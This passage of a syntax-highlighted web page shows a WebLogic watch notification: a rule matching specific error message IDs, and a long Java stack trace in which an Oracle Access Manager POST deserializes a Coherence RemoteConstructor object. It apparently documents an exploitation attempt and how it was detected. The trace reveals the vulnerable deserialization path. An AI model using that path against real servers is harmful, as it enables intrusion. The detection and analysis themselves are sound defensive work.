style=color:#960050;background-color:#1e0010>AM</span> <span style=color:#960050;background-color:#1e0010>UTC.</span> <span style=color:#960050;background-color:#1e0010>Notification</span> <span style=color:#960050;background-color:#1e0010>details:</span> 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>WatchRuleType:</span> <span style=color:#960050;background-color:#1e0010>Log</span> 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>WatchRule:</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.severityString =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;Error&#39;)</span> <span style=color:#960050;background-color:#1e0010>and</span> <span style=color:#960050;background-color:#1e0010>((</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;WL-101020&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;WL-101017&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;WL-000802&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;BEA-101020&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;BEA-101017&#39;)</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>(</span><span style=color:#a6e22e>log.messageId =</span><span style=color:#e6db74>=</span> <span style=color:#960050;background-color:#1e0010>&#39;BEA-000802&#39;))</span> 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>WatchData:</span> <span style=color:#a6e22e>MESSAGE =</span> <span style=color:#e6db74>[ServletContext@523535658[app:oam_server</span> <span style=color:#960050;background-color:#1e0010>module:oam</span> <span style=color:#960050;background-color:#1e0010>path:null</span> <span style=color:#960050;background-color:#1e0010>spec-version:3.1]]</span> <span style=color:#960050;background-color:#1e0010>Root</span> <span style=color:#960050;background-color:#1e0010>cause</span> <span style=color:#960050;background-color:#1e0010>of</span> <span style=color:#960050;background-color:#1e0010>ServletException.</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>java.lang.NoClassDefFoundError:</span> <span style=color:#960050;background-color:#1e0010>com/tangosol/internal/util/invoke/Remotable</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass1(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass(ClassLoader.java:756)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass(ClassLoader.java:635)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.NativeMethodAccessorImpl.invoke0(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.reflect.Method.invoke(Method.java:498)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectStreamClass.invokeReadResolve(ObjectStreamClass.java:1275)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2194)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.proxy.opensso.controller.OpenssoEngineController.processEvent(OpenssoEngineController.java:1069)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.processEvent(MasterController.java:596)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.processRequest(MasterController.java:788)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.process(MasterController.java:708)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>javax.servlet.http.HttpServlet.service(HttpServlet.java:707)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>javax.servlet.http.HttpServlet.service(HttpServlet.java:790)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.security.AccessController.doPrivileged(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.security.acl.internal.AuthenticatedSubject.doAs(AuthenticatedSubject.java:344)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.security.service.SecurityManager.runAsForUserCode(SecurityManager.java:197)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.WlsSecurityProvider.runAsForUserCode(WlsSecurityProvider.java:203)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.WlsSubjectHandle.run(WlsSubjectHandle.java:71)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.doSecuredExecute(WebAppServletContext.java:2451)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.securedExecute(WebAppServletContext.java:2299)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext.execute(WebAppServletContext.java:2277)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletRequestImpl.runInternal(ServletRequestImpl.java:1720)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletRequestImpl.run(ServletRequestImpl.java:1680)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.provider.ContainerSupportProviderImpl$WlsRequestExecutor.run(ContainerSupportProviderImpl.java:272)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.invocation.ComponentInvocationContextManager._runAs(ComponentInvocationContextManager.java:352)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.invocation.ComponentInvocationContextManager.runAs(ComponentInvocationContextManager.java:337)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.LivePartitionUtility.doRunWorkUnderContext(LivePartitionUtility.java:57)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.PartitionUtility.runWorkUnderContext(PartitionUtility.java:41)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.SelfTuningWorkManagerImpl.runWorkUnderContext(SelfTuningWorkManagerImpl.java:655)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.ExecuteThread.execute(ExecuteThread.java:420)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.work.ExecuteThread.run(ExecuteThread.java:360)</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Caused</span> <span style=color:#960050;background-color:#1e0010>By:</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassNotFoundException:</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.Remotable</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.findClass(ClassLoader.java:523)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.loadClass(ClassLoader.java:418)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.loadClass(ClassLoader.java:351)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass1(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass(ClassLoader.java:756)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.ClassLoader.defineClass(ClassLoader.java:635)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemotableSupport.defineClass(RemotableSupport.java:181)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemotableSupport.realize(RemotableSupport.java:137)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemoteConstructor.newInstance(RemoteConstructor.java:122)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>com.tangosol.internal.util.invoke.RemoteConstructor.readResolve(RemoteConstructor.java:233)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.NativeMethodAccessorImpl.invoke0(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.lang.reflect.Method.invoke(Method.java:498)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectStreamClass.invokeReadResolve(ObjectStreamClass.java:1275)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2194)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.rmi.provider.BasicServiceContext.readExternal(BasicServiceContext.java:56)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readExternalData(ObjectInputStream.java:2234)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2183)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:501)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.io.ObjectInputStream.readObject(ObjectInputStream.java:459)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.proxy.opensso.controller.OpenssoEngineController.unmarshal(OpenssoEngineController.java:2453)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.proxy.opensso.controller.OpenssoEngineController.processEvent(OpenssoEngineController.java:1069)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.processEvent(MasterController.java:596)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.processRequest(MasterController.java:788)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.controller.MasterController.process(MasterController.java:708)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.delegateToMasterController(PBLFlowManager.java:221)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.handleBaseEvent(PBLFlowManager.java:147)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.PBLFlowManager.processRequest(PBLFlowManager.java:107)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.transport.http.AMServlet.handleRequest(AMServlet.java:221)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.am.pbl.transport.http.AMServlet.doPost(AMServlet.java:177)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>javax.servlet.http.HttpServlet.service(HttpServlet.java:707)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>javax.servlet.http.HttpServlet.service(HttpServlet.java:790)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:295)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction.run(StubSecurityHelper.java:260)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.StubSecurityHelper.invokeServlet(StubSecurityHelper.java:137)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.ServletStubImpl.execute(ServletStubImpl.java:353)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.TailFilter.doFilter(TailFilter.java:25)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter$3.run(JpsAbsFilter.java:175)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>java.security.AccessController.doPrivileged(Native</span> <span style=color:#960050;background-color:#1e0010>Method)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.util.JpsSubject.doAsPrivileged(JpsSubject.java:315)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.util.JpsPlatformUtil.runJaasMode(JpsPlatformUtil.java:650)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.runJaasMode(JpsAbsFilter.java:112)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.doFilterInternal(JpsAbsFilter.java:293)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsAbsFilter.doFilter(JpsAbsFilter.java:150)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.security.jps.ee.http.JpsFilter.doFilter(JpsFilter.java:94)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.dms.servlet.DMSServletFilter.doFilter(DMSServletFilter.java:248)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>oracle.jrf.servlet.ExtensibleGlobalFilter.doFilter(ExtensibleGlobalFilter.java:92)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.FilterChainImpl.doFilter(FilterChainImpl.java:78)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.wrapRun(WebAppServletContext.java:3797)</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction.run(WebAppServletContext.java:3763)</span>
